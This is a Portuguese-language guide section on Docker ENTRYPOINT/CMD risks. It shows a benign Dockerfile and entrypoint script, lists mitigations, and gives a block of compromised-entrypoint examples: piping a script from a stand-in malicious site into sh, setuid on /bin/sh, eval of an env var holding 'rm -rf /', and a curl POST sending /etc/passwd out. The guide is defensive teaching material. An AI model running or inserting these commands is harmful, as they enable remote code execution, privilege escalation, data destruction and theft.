# Execução de código malicioso via ENTRYPOINT ou CMD
---


[Artigo Principal](../index.html/#6-execução-de-código-malicioso-via-entrypoint-ou-cmd)

Quando construimos um Dockerfile, é comum termos o entrypoint, que é o que será executado toda vez que este container subir. 

Em muito cenários fica complexo e sem sentido escrever todo um ENTRYPOINT no próprio Dockerfile. 

Exemplo, se eu quiser rodar um comando poetry na minha aplicação python, que ira disparar migrations do banco de dados, comumente eu externo isto para um arquivo `entrypoint.sh` e coloco todos os comandos necessários nele. 

Portanto este arquivo esta externo e não explicito no meu Dockerfile. O que pode ocasionar algum risco de exploração, portanto é importante que se conheça o Dockerfile e entenda o que ele esta fazendo, que neste exemplo é chamar outro arquivo para dar inicio as atividades do container. 

Exempo Dockerfile 

```
FROM python:3.13-slim
ENV POETRY_VIRTUALENVS_CREATE=false

WORKDIR app/
COPY . .

RUN pip install poetry

RUN poetry config installer.max-workers 10
RUN poetry install --no-interaction --no-ansi
RUN chmod +x ./entrypoint.sh

EXPOSE 8000

ENTRYPOINT ["./entrypoint.sh"]
```

O arquivo entrypoint é o seguinte

```
#!/bin/sh

# Executa as migrações do banco de dados
poetry run alembic upgrade head

# Inicia a aplicação
poetry run uvicorn --host 0.0.0.0 --port 8000 todolist.app:app
```

Desta forma garantimos que o `alembic` rode na inicialização antes de iniciar a app. 

### Riscos

Os maiores riscos nesta abordagem, que geralmente é uma boa prática e muito feita na construção de Dockerfile, é quando não entendemos ou não conhecemos nosso arquivo `entrypoint.sh`, quando ele acessa um site externo, ou então quando temos modificações nele que baixam scripts externos, ou aplicam scripts desconhecidos na nossa imagem, abrindo portas ou afins. 


Exemplos de ENTRYPOINT comprometido: 

```
#Site malicioso 

CMD ["sh", "-c", "curl http://site-malicioso.com/exploit.sh | sh"]
--------------------------------------------------------------------
#Escalada de privilégio 

ENTRYPOINT ["chmod", "4755", "/bin/sh"]  # Roda /bin/sh como root
--------------------------------------------------------------------
#Injeção de env var maliciosa

ENTRYPOINT ["/app/script.sh"]

#O script roda `eval $ENV_VAR_COMPROMETIDA`
#E o valor da env var é ENV_VAR_COMPROMETIDA="rm -rf /"
--------------------------------------------------------------------

# Envio de informações 

ENTRYPOINT ["/app/script.sh"]

#Conteudo do script tiver um `curl -X POST https://site-malicioso.com --data-binary @/etc/passwd`
#Estamos fazendo um post a um site passando todo nosso arquivo de usuarios e senhas 

```


### Mitigação

Para mitigar os problemas, geralmente usamos aquelas velhas boas práticas, como:

- Rodar como non-root  
- Restringir acesso de rede aos containers, acessar somente o que é necessários  
- Evitar usar `eval` e `exec`  
- Ter scripts de entrypoint o mais simples possíveis, e explicitos  
- Usar tags como `--no-new-privileges` no docker para previnir novos usuarios sendo criados depois de execução  
- Usar checksum no download de binários diretamente para a imagem.  

Seguir as boas praticas e conhecer o seu conteudo, baixar imagens confiaveis e conhecidas, usar imagens distroless e minimalistas ajudam a conter estes tipos de ataque. 





